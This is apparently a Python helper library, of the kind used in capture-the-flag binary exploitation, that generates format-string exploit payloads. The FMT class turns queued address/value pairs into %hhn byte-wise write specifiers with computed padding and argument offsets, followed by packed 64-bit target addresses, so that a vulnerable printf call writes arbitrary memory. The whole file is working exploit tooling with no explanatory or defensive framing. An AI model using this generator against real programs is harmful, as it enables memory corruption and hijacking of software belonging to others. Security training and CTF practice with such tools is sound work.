import math
import struct

class FMT:
    hhn = "%{}c%{}$hhn"
    hn  = "%{}c%{}$hn"
    n   = "%{}c%{}$n"
    lln = "%{}c%{}$lln"

    def __init__(self):
        self.buffer = []
        self.address = []
        self.fmt = []
        self.printed = 0

    def p64(self, data, fmt = "<Q"):
        return struct.pack(fmt, data)

    def _append(self, address, fmt):
        self.address.append(address)
        self.fmt.append(fmt)

    def _fmt_width(self, offset, distance):
        width = 0
        for i, fmt in enumerate(self.fmt): width += len(fmt.format(offset + distance + i))
        return width

    def _write(self, address, value):
        # set one byte at a time ( 0x00000000000000?? to 0x??00000000000000 )
        for i in range(8):
            value_now = (value >> (8 * i)) & 0xff
            value_append = (value_now - self.printed + 0x100) % 0x100
            self.printed = value_now
            # can't write %0c, but we can write %256c
            if value_append == 0: value_append = 256
            self._append(address + i, self.hhn.format(value_append, "{}"))

    def __setitem__(self, address, value):
        self.buffer.append((address, value))

    def payload(self, offset, printed = 0):
        self.printed = printed
        for address, value in self.buffer: self._write(address, value)
        # calculate how far the distance between fmt and address is
        distance = 0
        while True:
            width = self._fmt_width(offset, distance)
            distance_new = int(math.ceil(width / 8.0))
            if distance == distance_new: break
            distance = distance_new

        # generate payload
        payload = b""
        for i, fmt in enumerate(self.fmt): payload += fmt.format(offset + distance + i).encode('ascii')
        payload += b"\x00" * (8 - len(payload) % 8)
        payload += b''.join(map(self.p64, self.address))
        
        # reset
        self.printed = 0
        self.buffer = []
        self.address = []
        self.fmt = []

        return payload
